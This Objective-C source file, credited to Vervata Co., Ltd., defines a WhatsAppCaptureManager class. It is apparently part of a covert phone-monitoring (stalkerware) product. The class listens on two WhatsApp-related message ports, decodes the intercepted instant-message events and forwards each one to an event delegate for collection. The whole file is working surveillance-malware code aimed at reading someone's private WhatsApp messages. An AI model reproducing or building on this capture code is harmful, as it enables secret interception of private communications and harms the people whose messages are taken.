/**
 - Project name :  WhatsAppCaptureManager 
 - Class name   :  WhatsAppCaptureManager.m
 - Version      :  1.0  
 - Purpose      :  For WhatsAppMessageCapture  
 - Copy right   :  28/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */

#import "WhatsAppCaptureManager.h"
#import "DefStd.h"
#import "EventCenter.h"
#import "FxIMEvent.h"
#import "FxLogger.h"
#import "FxIMEventUtils.h"

@implementation WhatsAppCaptureManager

- (id) initWithEventDelegate: (id <EventDelegate>) aEventDelegate {
	if ((self = [super init])) {
		mEventDelegate = aEventDelegate;
	}
	return (self);
}

- (void) startCapture {
	if (!mMessagePortReader1) {
		mMessagePortReader1 = [[MessagePortIPCReader alloc] initWithPortName:kWhatsAppMessagePort1
												  withMessagePortIPCDelegate:self];
		[mMessagePortReader1 start];
	}
	if (!mMessagePortReader2) {
		mMessagePortReader2 = [[MessagePortIPCReader alloc] initWithPortName:kWhatsAppMessagePort2 
												  withMessagePortIPCDelegate:self];
		[mMessagePortReader2 start];
	}
	
}

- (void) stopCapture {
	if (mMessagePortReader1) {
		[mMessagePortReader1 stop];
		[mMessagePortReader1 release];
		mMessagePortReader1 = nil;
	}
	if (mMessagePortReader2) {
		[mMessagePortReader2 stop];
		[mMessagePortReader2 release];
		mMessagePortReader2 = nil;
	}
}

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	DLog (@"WhatsAppCaptureManager ----> dataDidReceivedFromMessagePort")
	
	NSKeyedUnarchiver *unarchiver = [[NSKeyedUnarchiver alloc] initForReadingWithData:aRawData];	
    FxIMEvent *imEvent = [unarchiver decodeObjectForKey:kiMessageArchived];
	[unarchiver finishDecoding];
	
	if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {		
		NSArray *imStructureEvents = [FxIMEventUtils digestIMEvent:imEvent];	
		for (FxEvent *imStructureEvent in imStructureEvents) {		
			DLog (@"sending %@ ...", imStructureEvent)						
			[mEventDelegate performSelector:@selector(eventFinished:) withObject:imStructureEvent];				
		}			
	}
	[unarchiver release];
}

- (void) dealloc {
	[self stopCapture];
	[super dealloc];
}

@end
